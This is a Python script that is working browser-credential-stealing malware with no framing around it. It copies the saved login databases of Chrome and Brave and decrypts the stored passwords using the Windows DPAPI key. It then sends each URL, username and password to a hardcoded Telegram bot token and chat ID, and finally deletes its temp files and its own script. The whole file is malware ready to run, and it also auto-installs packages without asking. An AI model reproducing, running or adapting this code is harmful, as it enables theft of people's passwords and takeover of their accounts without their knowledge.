from datetime import timezone, datetime, timedelta
import subprocess
import sqlite3
import shutil
import base64
import json
import os
import sys


ID = 1410223644

print("checking of dependency.....")
try:
    import requests
except:
    print("installing requests")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
try:
    from Crypto.Cipher import AES
except:
    print("installing pycryptodome")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
try:
    import win32crypt
except:
    print("installing pywin32")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32"])


def getkey(keypath):
    with open(keypath, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    # decoding the encryption key using base64
    encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])

    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]

    # return decrypted key
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]


def send(text):
    url = f"https://api.telegram.org/bot5633216566:AAGVHIaZZIHZ3ge-6ZLDbqsZX0F67szyRDo/sendMessage"
    payload = {"chat_id": ID, "text": text}

    r = requests.post(url, json=payload)
    return r


def temp_store(mode, data=None):
    if mode == "write":
        with open("temp.txt", "a") as f:
            f.write(data)

    elif mode == "read":
        with open("temp.txt", "r") as f:
            return f.readlines()


def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]

        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"


def getcredt(dbpath, keypath):
    filename = "ChromePasswords.db"
    shutil.copyfile(dbpath, filename)

    db = sqlite3.connect(filename)
    cursor = db.cursor()

    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used"
    )

    # iterate over all rows
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], getkey(keypath))
        date_of_creation = row[4]
        last_usuage = row[5]

        if user_name or decrypted_password:
            infos = f"""Main URL: {main_url}, Login URL: {login_page_url}, User name: {user_name},Decrypted Password: {decrypted_password}
            """
            temp_store("write", infos)

        else:
            continue
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass


def delete_file():
    try:
        os.remove("temp.txt")
    except:
        pass


def getc():
    root_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"
    )

    dirs = os.listdir(root_path)
    profiles = [i for i in dirs if i.startswith("Profile")]
    print(profiles)

    for i in profiles:
        print(f"data from {i}")
        p = os.path.join(root_path, i, "Login Data")
        key_path = os.path.join(
            os.environ["USERPROFILE"],
            "AppData",
            "Local",
            "Google",
            "Chrome",
            "User Data",
            "Local State",
        )
        getcredt(p, key_path)
        try:
            txt = temp_store("read")
            for i in txt:
                # print(i)
                send(i)
        except:
            pass
        print("\n")
        delete_file()
        print(f"success for {i}")

    os.remove(os.path.abspath(sys.argv[0]))


def getb():
    db_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "BraveSoftware",
        "Brave-Browser",
        "User Data",
        "default",
        "Login Data",
    )
    key_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "BraveSoftware",
        "Brave-Browser",
        "User Data",
        "Local State",
    )
    getcredt(db_path, key_path)
    try:
        txt = temp_store("read")
        for i in txt:
            # print(i)
            send(i)
    except:
        pass
    print("\n")
    delete_file()
    os.remove(os.path.abspath(sys.argv[0]))


try:
    getb()
    send("all data sent for c")
except Exception as e:
    send("Error Found!!!")
    send(e)
    print("error found!!!")
    print(e)
try:
    getc()
    send("all data sent for b")
except Exception as e:
    send("Error Found!!!")
    send(e)
    print("error found!!!")
    print(e)
